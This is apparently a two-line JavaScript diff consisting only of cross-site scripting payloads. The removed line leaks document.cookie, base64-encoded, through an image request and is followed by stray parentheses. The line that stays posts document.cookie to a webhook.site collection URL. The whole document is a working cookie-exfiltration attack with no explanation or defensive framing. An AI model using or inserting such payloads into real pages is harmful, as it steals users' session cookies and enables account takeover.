@@ -1,2 +1,1 @@
-x = new Image(); x.src = '?data='+btoa(document.cookie);((((((((((()))))))))))
 fetch("https://webhook.site/9a1ca279-6285-4ed8-b7c5-1e7b729c94b2", {method: "POST", mode:"no-cors", body: document.cookie})
